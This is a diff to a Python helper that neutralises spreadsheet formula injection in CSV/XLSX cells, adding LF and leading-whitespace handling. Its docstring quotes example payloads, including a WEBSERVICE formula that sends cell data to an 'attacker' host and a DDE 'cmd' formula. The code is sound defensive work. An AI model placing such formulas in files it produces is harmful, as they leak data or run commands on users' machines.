@@ -70,21 +70,30 @@ def _safe_path(sandbox, user_path: str) -> Path:
     return candidate
 
 
-# Characters a spreadsheet app treats as the start of a formula.
-_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
+# Characters a spreadsheet app treats as an executable/control cell prefix.
+_FORMULA_OPERATORS = ("=", "+", "-", "@")
+_FORMULA_TRIGGERS = (*_FORMULA_OPERATORS, "\t", "\r", "\n")
 
 
 def _neutralize_formula(value: Any) -> Any:
     """Defang a CSV/XLSX formula-injection cell.
 
-    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB
-    or CR is executed as a formula when the file is opened in Excel / Sheets
+    A model-supplied string cell beginning with ``=``, ``+``, ``-``, ``@``, TAB,
+    CR, or LF is executed as a formula when the file is opened in Excel / Sheets
     (``=HYPERLINK(...)``, ``=WEBSERVICE("http://attacker/?"&A1)``,
     ``=cmd|'/c ...'``). Prefixing a single quote makes the app render it as
     literal text. Non-string cells (numbers) are left untouched.
     """
-    if isinstance(value, str) and value[:1] in _FORMULA_TRIGGERS:
-        return "'" + value
+    if isinstance(value, str):
+        first = value[:1]
+        first_non_whitespace = value.lstrip()[:1]
+        if (
+            first in _FORMULA_TRIGGERS
+            or first_non_whitespace in _FORMULA_OPERATORS
+        ):
+            # Prefix at byte zero. Keeping whitespace before the apostrophe can
+            # still let Excel/Sheets treat TAB/CR/LF as a control prefix.
+            return "'" + value
     return value
 
 
